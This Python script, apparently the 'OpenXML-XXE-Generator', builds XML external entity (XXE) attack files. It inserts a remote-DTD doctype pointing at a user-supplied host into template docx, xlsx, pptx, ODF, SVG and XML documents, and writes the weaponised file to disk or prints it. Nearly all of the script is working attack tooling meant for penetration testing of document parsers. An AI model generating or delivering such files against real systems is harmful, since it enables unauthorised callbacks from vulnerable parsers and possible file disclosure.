import argparse

payloads = {
    "rdtd": {
        "payload": '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/FILE">',
        "description": "A Remote DTD causes the XML parser to make an external connection when successful.",
    }
}

filetypes = {
    "docx": "samples/template.docx",
    "odg": "samples/template.odg",
    "odp": "samples/template.odp",
    "ods": "samples/template.ods",
    "odt": "samples/template.odt",
    "pptx": "samples/template.pptx",
    "svg": "samples/template.svg",
    "xlsx": "samples/template.xlsx",
    "xml": "samples/template.xml",
}


class XXeFile:
    def __init__(self, host, protocol, filetype, payload, outfile=None):
        if not host:
            raise KeyError("Please specify a valid host")
        if not protocol:
            raise KeyError("Please specify a valid protocol")
        if not filetype:
            raise KeyError("Please specify a valid filetype")
        if not payload:
            raise KeyError("Please specify a valid payload")

        if not filetype in filetypes:
            raise KeyError("Please specify a valid filetype")
        if not payload in payloads:
            raise KeyError("Please specify a valid payload")
        self.host = host
        self.protocol = protocol
        self.filetype = filetype
        self.template = filetypes[filetype]
        self.payload = payloads[payload]["payload"]
        self.description = payloads[payload]["description"]
        self.outfile = outfile

    def generate_payload(self):
        with open(self.template, "rb") as tmpl:
            tempdat = tmpl.read().decode("utf8")
            if "IP" in self.payload:
                self.payload = self.payload.replace(
                    "IP", self.protocol + self.host
                )
            tempdat = tempdat.replace("PAYLOAD", self.payload)
            return tempdat

    @property
    def to_file(self):
        tempdat = self.generate_payload()
        with open(self.outfile, "wb") as out:
            out.write(bytes(tempdat, "utf8"))

    @property
    def to_text(self):
        tempdat = self.generate_payload()
        print(tempdat)


def main():
    parser = argparse.ArgumentParser(
        description="OpenXML-XXE-Generator by Richard Clifford & Jordy Zomer"
    )
    parser.add_argument(
        "--host", type=str, help="The host to use in your payloads"
    )
    parser.add_argument(
        "--protocol",
        type=str,
        help="The protocol to use in your payloads",
        default="http://",
    )
    parser.add_argument(
        "--type", type=str, help="The type to use in your payloads"
    )
    parser.add_argument(
        "--payload", type=str, help="The payload to use in your payloads"
    )
    parser.add_argument(
        "--outfile", type=str, help="The outfile to use in your outfiles"
    )
    args = parser.parse_args()

    obj = XXeFile(
        args.host, args.protocol, args.type, args.payload, args.outfile
    )

    print(obj.host, obj.protocol, obj.payload, obj.template)
    if obj.outfile is None:
        obj.to_text
    else:
        obj.to_file


if __name__ == "__main__":
    main()
